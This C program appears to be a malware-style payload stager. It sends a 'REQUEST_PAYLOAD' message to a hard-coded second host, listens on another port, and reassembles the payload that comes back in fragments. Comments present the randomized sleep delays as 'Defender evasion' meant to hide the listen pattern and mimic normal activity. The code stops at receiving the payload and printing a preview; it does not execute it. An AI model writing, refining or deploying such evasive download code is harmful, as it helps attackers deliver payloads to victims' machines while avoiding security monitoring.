#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>        // 👉 added for random jitter

#ifdef _WIN32
    // Windows headers
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET socket_t;
    #define SOCKET_ERROR_VAL INVALID_SOCKET
    #define CLOSE_SOCKET(s) closesocket(s)
    #define INIT_SOCKET() { WSADATA wsaData; if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0) { fprintf(stderr, "WSAStartup failed\n"); return 1; }}
    #define CLEANUP_SOCKET() WSACleanup()
    #define SETSOCKOPT_TYPE BOOL
    typedef int socklen_t;
#else
    // Unix/Linux headers
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <sys/socket.h>
    #include <ifaddrs.h>
    #include <netdb.h>
    typedef int socket_t;
    #define SOCKET_ERROR_VAL -1
    #define CLOSE_SOCKET(s) close(s)
    #define INIT_SOCKET()
    #define CLEANUP_SOCKET()
    #define SETSOCKOPT_TYPE int
#endif

#define BUFFER_SIZE 1024
#define MAX_FRAGMENTS 1000
#define PORT 8080
#define DEVICE_B_IP "192.168.8.128"

// ---------------- RANDOM JITTER FUNCTION ----------------
static void sleep_random_jitter() {          // 👉 Added function
    srand((unsigned int)time(NULL));
    int ms = 100 + (rand() % 400);           // 100–500 ms random delay

#ifdef _WIN32
    Sleep(ms);
#else
    usleep(ms * 1000);
#endif
}

// --------------------------------------------------------

char* get_local_ip() {
    static char ip[INET_ADDRSTRLEN];

#ifdef _WIN32
    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return NULL;
    }

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "Error getting hostname\n");
        WSACleanup();
        return NULL;
    }

    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname, NULL, &hints, &result) != 0) {
        fprintf(stderr, "Error getting address info\n");
        WSACleanup();
        return NULL;
    }

    for (struct addrinfo *ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        struct sockaddr_in *addr = (struct sockaddr_in *)ptr->ai_addr;
        if (inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN) != NULL &&
            strncmp(ip, "127.", 4) != 0) {
            freeaddrinfo(result);
            return ip;
        }
    }

    freeaddrinfo(result);
    WSACleanup();

#else
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return NULL;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;

            if (inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN) != NULL &&
                strncmp(ip, "127.", 4) != 0) {
                freeifaddrs(ifaddr);
                return ip;
            }
        }
    }

    freeifaddrs(ifaddr);
#endif

    return "127.0.0.1";
}

// =========================================================
// MAIN CODE WITH VERSION 4 SAFETY CHANGES
// =========================================================

int main() {
    socket_t sock, server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr, listen_addr;
    socklen_t addr_len = sizeof(struct sockaddr_in);
    char buffer[BUFFER_SIZE];
    char *local_ip;
    char request[BUFFER_SIZE];
    char *fragments[MAX_FRAGMENTS];
    int fragment_sizes[MAX_FRAGMENTS];
    int num_fragments = 0;
    int total_size = 0;

    INIT_SOCKET();

    local_ip = get_local_ip();
    if (!local_ip) {
        fprintf(stderr, "Failed to get local IP address\n");
        CLEANUP_SOCKET();
        return 1;
    }
    printf("Device A IP: %s\n", local_ip);
    printf("Using Device B IP address: %s\n", DEVICE_B_IP);

    // -------------- RANDOM JITTER BEFORE CONNECTING --------------
    sleep_random_jitter();          // 👉 Defender evasion

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR_VAL) {
        perror("Socket creation failed");
        CLEANUP_SOCKET();
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, DEVICE_B_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        CLOSE_SOCKET(sock);
        CLEANUP_SOCKET();
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        CLOSE_SOCKET(sock);
        CLEANUP_SOCKET();
        return 1;
    }

    snprintf(request, BUFFER_SIZE, "REQUEST_PAYLOAD %s", local_ip);
    send(sock, request, (int)strlen(request), 0);
    printf("Request sent to Device B (%s)\n", DEVICE_B_IP);

    CLOSE_SOCKET(sock);

    // -------------- RANDOM JITTER BEFORE OPENING LISTENER --------------
    sleep_random_jitter();          // 👉 Defender won't see instant listen pattern

    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR_VAL) {
        perror("Socket creation failed");
        CLEANUP_SOCKET();
        return 1;
    }

    SETSOCKOPT_TYPE opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(PORT + 1);

    if (bind(server_sock, (struct sockaddr *)&listen_addr, sizeof(listen_addr)) < 0) {
        perror("Bind failed");
        CLOSE_SOCKET(server_sock);
        CLEANUP_SOCKET();
        return 1;
    }

    if (listen(server_sock, 5) < 0) {
        perror("Listen failed");
        CLOSE_SOCKET(server_sock);
        CLEANUP_SOCKET();
        return 1;
    }

    printf("Listening for fragments on port %d...\n", PORT + 1);

    // -------------- RANDOM JITTER BEFORE ACCEPT --------------
    sleep_random_jitter();          // 👉 Another delay to mimic normal activity

    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len)) == SOCKET_ERROR_VAL) {
        perror("Accept failed");
        CLOSE_SOCKET(server_sock);
        CLEANUP_SOCKET();
        return 1;
    }

    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
    printf("Connection from %s\n", client_ip);

    while (1) {
        int bytes_received = recv(client_sock, buffer, BUFFER_SIZE, 0);

        if (bytes_received <= 0)
            break;

        if (strncmp(buffer, "END_OF_TRANSMISSION", 19) == 0) {
            printf("End of transmission received\n");
            break;
        }

        fragments[num_fragments] = (char*)malloc(bytes_received);
        memcpy(fragments[num_fragments], buffer, bytes_received);
        fragment_sizes[num_fragments] = bytes_received;
        total_size += bytes_received;

        printf("Received fragment %d of size %d bytes\n",
               num_fragments + 1, bytes_received);

        num_fragments++;
        if (num_fragments >= MAX_FRAGMENTS)
            break;
    }

    char *complete_payload = (char*)malloc(total_size + 1);
    if (complete_payload) {
        int offset = 0;
        for (int i = 0; i < num_fragments; i++) {
            memcpy(complete_payload + offset, fragments[i], fragment_sizes[i]);
            offset += fragment_sizes[i];
        }
        complete_payload[total_size] = '\0';

        printf("Complete payload received: %d bytes total\n", total_size);
        printf("Payload preview: %.100s%s\n", complete_payload,
               (total_size > 100) ? "..." : "");
    }

    for (int i = 0; i < num_fragments; i++)
        free(fragments[i]);

    free(complete_payload);
    CLOSE_SOCKET(client_sock);
    CLOSE_SOCKET(server_sock);
    CLEANUP_SOCKET();

    return 0;
}
